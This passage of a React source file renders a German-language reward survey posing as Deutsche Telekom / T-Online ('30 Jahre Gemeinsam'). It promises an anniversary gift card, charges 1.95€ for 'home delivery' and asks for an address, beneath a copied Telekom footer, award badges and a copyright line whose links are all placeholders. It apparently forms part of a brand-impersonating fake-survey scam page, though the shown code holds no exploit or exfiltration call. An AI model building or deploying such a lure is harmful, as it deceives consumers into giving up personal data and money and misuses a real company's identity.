                      >
                        <RadioGroupItem 
                          value="email" 
                          id="email-delivery-desktop" 
                          className="mt-0.5 shrink-0" 
                        />
                        <div className="flex-1 flex items-center justify-between">
                          <div className="text-left">
                            <Label htmlFor="email-delivery-desktop" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                              📧 E-Mail-Versand
                            </Label>
                            <div className="text-sm text-gray-600 mt-1">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
                          </div>
                          <div className="text-green-600 font-semibold">Kostenlos</div>
                        </div>
                      </div>

                      {/* Home Delivery Option */}
                      <div 
                        onClick={handleHomeSelect}
                        className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 cursor-pointer"
                      >
                        <RadioGroupItem 
                          value="home" 
                          id="home-delivery-desktop" 
                          className="mt-0.5 shrink-0" 
                        />
                        <div className="flex-1 flex items-center justify-between">
                          <div className="text-left">
                            <Label htmlFor="home-delivery-desktop" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                              🏠 Heimversand
                            </Label>
                            <div className="text-sm text-gray-600 mt-1">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
                          </div>
                          <div className="font-semibold text-gray-800">+1.95€</div>
                        </div>
                      </div>
                    </RadioGroup>

                    {selectedDelivery === 'home' && (
                      <>
                        <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>

                        <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
                          <div className="flex items-start space-x-2">
                            <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
                            <div className="text-sm text-blue-700">
                              Wir senden Ihnen eine E-Mail mit den Versandinformationen und den Details Ihrer 
                              Bestellung, sobald Ihre Adresse erfolgreich überprüft wurde und Sie zur Lieferung 
                              berechtigt sind.
                            </div>
                          </div>
                        </div>

                         <RadioGroup
                           value={selectedAddress}
                           onValueChange={(value) => handleAddressSelect(value)}
                           className="space-y-3"
                         >
                           {/* Meine Adresse Option */}
                           <div 
                             onClick={() => handleAddressSelect('meine')}
                             className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 cursor-pointer"
                           >
                             <RadioGroupItem 
                               value="meine" 
                               id="meine-adresse-desktop" 
                               className="mt-0.5 shrink-0" 
                             />
                             <div className="flex-1">
                               <Label htmlFor="meine-adresse-desktop" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                                 👤 Meine Adresse
                               </Label>
                               <div className="text-sm text-gray-600 mt-1">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
                             </div>
                           </div>

                           {/* Grayed out option - nicht auswählbar */}
                           <div className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 bg-gray-100 opacity-60 cursor-not-allowed">
                             <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-gray-200 mt-0.5 shrink-0"></div>
                             <div className="flex-1">
                               <div className="font-semibold text-gray-500 flex items-center">
                                 👥 Adresse einer anderen Person
                               </div>
                               <div className="text-sm text-gray-400 mt-1">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                             </div>
                           </div>
                         </RadioGroup>

                        {selectedAddress === 'meine' && (
                          <Button 
                            onClick={handleWeiterClick}
                            className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors"
                          >
                            Weiter
                          </Button>
                        )}

                        <p className="text-xs text-gray-500 mt-4">
                          Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
                          ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
                        </p>
                      </>
                    )}

                    {selectedDelivery !== 'home' && (
                      <Button 
                        className="w-full mt-6 bg-gray-300 text-gray-600 cursor-not-allowed"
                        disabled
                      >
                        Weiter
                      </Button>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Survey Questions */}
        {!isProcessing && !showRewards && (
          <div className="bg-white rounded-lg shadow-lg overflow-hidden mx-2 sm:mx-0">
            {/* Survey Header */}
            <div className="text-center py-6 sm:py-8 px-4 sm:px-6">
              <div className="flex items-center justify-center mb-4">
                <span className="text-3xl sm:text-4xl mr-2">🎉</span>
                <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center">
                  T-Online – 30 Jahre Gemeinsam!
                </h1>
              </div>
              <p className="text-pink-600 font-medium text-sm sm:text-base text-center px-2">
                Füllen Sie diese kurze Umfrage aus und sichern Sie sich Ihre exklusive Jubiläumsbelohnung!
              </p>
              
              {/* Progress Bar */}
              <div className="mt-6">
                <div className="flex items-center justify-between mb-2 text-xs sm:text-sm">
                  <span className="text-gray-500">Ihre Vorlieben & Ihr Feedback</span>
                  <span className="text-gray-500 font-medium">{currentStep} / {totalSteps}</span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2 mb-6">
                  <div 
                    className="bg-pink-600 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${(currentStep / totalSteps) * 100}%` }}
                  ></div>
                </div>
              </div>
            </div>

            {/* Question Content */}
            <div className="px-4 sm:px-8 pb-6 sm:pb-8">
              <div className="mb-6 sm:mb-8">
                <h2 className="text-base sm:text-lg font-semibold text-gray-800 mb-2 text-center">
                  {currentQuestion?.title} <span className="text-red-500">*</span>
                </h2>
                {currentQuestion?.subtitle && (
                  <p className="text-sm text-gray-500 text-center">{currentQuestion.subtitle}</p>
                )}
              </div>

              {/* Question Input */}
              {currentQuestion?.type === 'star-rating' && renderStarRating(currentQuestion.id)}
              {currentQuestion?.type === 'radio' && renderRadioOptions(currentQuestion.id, currentQuestion.options)}

              {/* Star Rating Text */}
              {currentQuestion?.type === 'star-rating' && answers[currentQuestion.id] && (
                <div className="text-center text-sm text-gray-500 mb-4 sm:mb-6">
                  {answers[currentQuestion.id]} von 5 Sternen
                </div>
              )}

              {/* Navigation Buttons */}
              <div className="flex flex-col sm:flex-row justify-between items-center pt-4 sm:pt-6 gap-3 sm:gap-0">
                <Button
                  variant="ghost"
                  onClick={handleBack}
                  disabled={currentStep === 1}
                  className="flex items-center justify-center space-x-2 w-full sm:w-auto order-2 sm:order-1 touch-manipulation"
                >
                  <ChevronLeft className="w-4 h-4" />
                  <span>Zurück</span>
                </Button>

                {currentStep === totalSteps ? (
                  <Button
                    onClick={handleSubmit}
                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2 touch-manipulation"
                    disabled={!answers[currentQuestion?.id]}
                  >
                    <span>Umfrage absenden</span>
                  </Button>
                ) : (
                  <Button
                    onClick={handleNext}
                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2 touch-manipulation"
                    disabled={!answers[currentQuestion?.id]}
                  >
                    <span>Weiter</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 text-white py-12 mt-16">
        <div className="max-w-7xl mx-auto px-4">
          <div className="mb-8">
            <h2 className="text-2xl font-bold mb-4">
              Feiern Sie mit: 30 Jahre Telekom mit exklusiven Jubiläumsaktionen
            </h2>
            <p className="text-gray-300 mb-6">
              Zu unserem besonderen Jubiläum gibt es etwas nur für Sie: exklusive Belohnungen und Überraschungen! Durch die Teilnahme an unserer Jubiläumsumfrage haben Sie die Chance, spannende Vorteile zu sichern.
            </p>
            <p className="text-gray-300 mb-6">
              Von Geschenkarten über spezielle Angebote und Bonus-Rabatte bis hin zu weiteren zeitlich begrenzten Prämien – hier ist für jeden etwas dabei. Die Verfügbarkeit kann variieren, daher lohnt es sich, schnell mitzumachen, um die besten Vorteile zu erhalten.
            </p>
            <p className="text-gray-300">
              Ob Einkaufsgutscheine, Technik-Gadgets oder einzigartige Jubiläums-Deals – dies ist Ihre Gelegenheit, belohnt zu werden. Klare Bedingungen und eine einfache Teilnahme sorgen dafür, dass Sie sofort erkennen, welche Vorteile Sie erwarten.
            </p>
            <p className="text-gray-300 mt-4">
              <strong>Verpassen Sie nichts – nehmen Sie jetzt an der Umfrage teil und entdecken Sie, welche Belohnungen auf Sie warten!</strong>
            </p>
          </div>
        </div>

        {/* Direkteinstiege Section */}
        <div className="bg-pink-600 py-12">
          <div className="max-w-7xl mx-auto px-4">
            <h2 className="text-3xl font-bold text-white text-center mb-12">Direkteinstiege</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 lg:gap-12">
              {/* Smartphones Column */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">Smartphones</h3>
                <ul className="space-y-3">
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">iPhone 16</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">iPhone 16 Plus</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">iPhone 16 Pro</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">iPhone 16 Pro Max</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Samsung Galaxy S25 Ultra</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Samsung Galaxy Z Flip7</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Xiaomi 15</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Google Pixel 9 Pro</a></li>
                </ul>
              </div>

              {/* Tarife Column */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">Tarife</h3>
                <ul className="space-y-3">
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Handyvertrag</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Young-Tarife</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Prepaid-Tarife</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Datentarife</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Watch- & Tracker-Tarife</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Zusatzkarten</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Unbegrenztes Datenvolumen</a></li>
                </ul>
              </div>

              {/* Themen Column */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">Themen</h3>
                <ul className="space-y-3">
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Handyvergleich</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Kombipaket</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Apple erleben</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Mobilfunk-Netzausbau</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Prepaid-Guthaben aufladen</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Vertragsverlängerung</a></li>
                  <li><a href="#" className="text-white hover:text-pink-200 transition-colors border-b border-white/20 pb-1 block">Speedtest</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        {/* New Footer Section */}
        <div className="bg-gray-900 py-12">
          <div className="max-w-7xl mx-auto px-4">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-12 mb-12">
              {/* Newsletter Section */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">Newsletter</h3>
                
                <div className="space-y-4 mb-6">
                  <label className="flex items-center space-x-3 text-white cursor-pointer">
                    <input type="checkbox" className="w-5 h-5 border-2 border-gray-400 rounded bg-transparent checked:bg-pink-600 checked:border-pink-600" />
                    <span>Aktionsangebote Mobilfunk</span>
                  </label>
                  <label className="flex items-center space-x-3 text-white cursor-pointer">
                    <input type="checkbox" className="w-5 h-5 border-2 border-gray-400 rounded bg-transparent checked:bg-pink-600 checked:border-pink-600" />
                    <span>Aktionsangebote Festnetz</span>
                  </label>
                </div>

                <div className="flex">
                  <input 
                    type="email" 
                    placeholder="Ihre E-Mail-Adresse" 
                    className="flex-1 px-4 py-3 bg-gray-800 border border-gray-600 text-white placeholder-gray-400 rounded-l-lg focus:outline-none focus:border-pink-600"
                  />
                  <button className="px-6 py-3 bg-gray-700 text-white border border-gray-600 border-l-0 rounded-r-lg hover:bg-gray-600 transition-colors">
                    Anmelden
                  </button>
                </div>
              </div>

              {/* MeinMagenta App Section */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">MeinMagenta App</h3>
                
                <p className="text-gray-300 mb-6">Alle Infos und bester Service für Mobilfunk & Festnetz</p>

                <div className="flex flex-col gap-3">
                  <a href="#" className="inline-block">
                    <div className="bg-black rounded-lg px-4 py-2 flex items-center space-x-2 hover:bg-gray-800 transition-colors">
                      <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center">
                        <span className="text-black text-xs font-bold">📱</span>
                      </div>
                      <div className="text-left">
                        <div className="text-xs text-gray-400">Laden im</div>
                        <div className="text-white font-semibold">App Store</div>
                      </div>
                    </div>
                  </a>

                  <a href="#" className="inline-block">
                    <div className="bg-black rounded-lg px-4 py-2 flex items-center space-x-2 hover:bg-gray-800 transition-colors">
                      <div className="w-8 h-8 bg-gradient-to-br from-blue-400 to-green-400 rounded-lg flex items-center justify-center">
                        <span className="text-white text-xs">▶</span>
                      </div>
                      <div className="text-left">
                        <div className="text-xs text-gray-400">JETZT BEI</div>
                        <div className="text-white font-semibold">Google Play</div>
                      </div>
                    </div>
                  </a>

                  <a href="#" className="inline-block">
                    <div className="bg-black rounded-lg px-4 py-2 flex items-center space-x-2 hover:bg-gray-800 transition-colors">
                      <div className="w-8 h-8 bg-red-500 rounded-lg flex items-center justify-center">
                        <span className="text-white text-xs">🏪</span>
                      </div>
                      <div className="text-left">
                        <div className="text-xs text-gray-400">JETZT IN DER</div>
                        <div className="text-white font-semibold">AppGallery</div>
                      </div>
                    </div>
                  </a>
                </div>
              </div>

              {/* Social Media Section */}
              <div>
                <h3 className="text-xl font-semibold text-white mb-6">Social Media</h3>
                
                <div className="grid grid-cols-2 gap-4 text-white">
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-sm">f</span>
                    <span>Facebook</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-blue-700 rounded flex items-center justify-center text-white text-sm">in</span>
                    <span>LinkedIn</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-red-600 rounded flex items-center justify-center text-white text-sm">▶</span>
                    <span>YouTube</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-gradient-to-br from-purple-400 to-pink-400 rounded flex items-center justify-center text-white text-sm">📷</span>
                    <span>Instagram</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-pink-600 rounded flex items-center justify-center text-white text-sm">T</span>
                    <span>Telekom hilft</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors">
                    <span className="w-6 h-6 bg-gray-700 rounded flex items-center justify-center text-white text-sm">💡</span>
                    <span>Ideenschmiede</span>
                  </a>
                  <a href="#" className="flex items-center space-x-3 hover:text-pink-200 transition-colors col-span-2">
                    <span className="w-6 h-6 bg-black rounded flex items-center justify-center text-white text-sm">🎵</span>
                    <span>tiktok</span>
                  </a>
                </div>
              </div>
            </div>

            {/* Awards Section */}
            <div className="mb-12 pt-8 border-t border-gray-700">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-8 items-center justify-items-center">
                <div className="bg-blue-600 text-white p-4 rounded-lg text-center min-h-[120px] flex flex-col justify-center">
                  <div className="text-sm font-bold">connect</div>
                  <div className="text-xs">TESTSIEGER</div>
                  <div className="text-xs mt-1">MOBILFUNK UND<br />5G-NETZTEST</div>
                  <div className="text-xs">Deutsche Telekom</div>
                  <div className="text-xs">Heft 1/2025</div>
                </div>
                
                <div className="bg-red-600 text-white p-4 rounded-lg text-center min-h-[120px] flex flex-col justify-center">
                  <div className="text-lg font-bold">CHIP</div>
                  <div className="text-sm">Bestes Netz</div>
                  <div className="text-xs mt-1">Das Qualitätsurteil<br />CHIP 01/2025</div>
                </div>

                <div className="bg-blue-600 text-white p-4 rounded-lg text-center min-h-[120px] flex flex-col justify-center">
                  <div className="text-sm font-bold">connect</div>
                  <div className="text-xs">TESTSIEGER</div>
                  <div className="text-xs mt-1">FESTNETZTEST<br />DEUTSCHLANDS ANBIETER</div>
                  <div className="text-xs">Telekom</div>
                  <div className="text-xs">Heft 02/2024</div>
                </div>

                <div className="bg-white text-gray-800 p-4 rounded-lg text-center border min-h-[120px] flex flex-col justify-center">
                  <div className="text-xs font-bold">WirtschaftsWoche</div>
                  <div className="text-lg font-bold">App</div>
                  <div className="text-sm">des Jahres</div>
                  <div className="text-xs">1. Platz<br />2025</div>
                  <div className="text-xs">Kundenfreundlich</div>
                </div>
              </div>
            </div>

            {/* Telekom Branding */}
            <div className="pt-8 border-t border-gray-700">
              <div className="flex items-center space-x-4 mb-8">
                <div className="w-12 h-12 bg-pink-600 rounded flex items-center justify-center">
                  <span className="text-white font-bold text-xl">T</span>
                </div>
                <div>
                  <div className="text-white font-semibold text-lg">Connecting</div>
                  <div className="text-white font-semibold text-lg">your world.</div>
                </div>
              </div>

              {/* Legal Links */}
              <div className="text-gray-400 text-sm">
                <div className="mb-4">© Telekom Deutschland GmbH</div>
                <div className="flex flex-wrap gap-x-6 gap-y-2">
                  <a href="#" className="hover:text-white transition-colors">Impressum</a>
                  <a href="#" className="hover:text-white transition-colors">Datenschutz</a>
                  <a href="#" className="hover:text-white transition-colors">Barrierefreiheit</a>
                  <a href="#" className="hover:text-white transition-colors">Utiq verwalten</a>
                  <a href="#" className="hover:text-white transition-colors">AGB</a>
                  <a href="#" className="hover:text-white transition-colors">Produktinformationsblatt</a>
                  <a href="#" className="hover:text-white transition-colors">Verbraucherinformationen</a>
                  <a href="#" className="hover:text-white transition-colors">Jugendschutz</a>
                  <a href="#" className="hover:text-white transition-colors">Hinweise ElektroG/BattG</a>
                  <a href="#" className="hover:text-white transition-colors">Compliance/Lieferkette</a>
                  <a href="#" className="hover:text-white transition-colors">Verträge hier kündigen</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Survey;
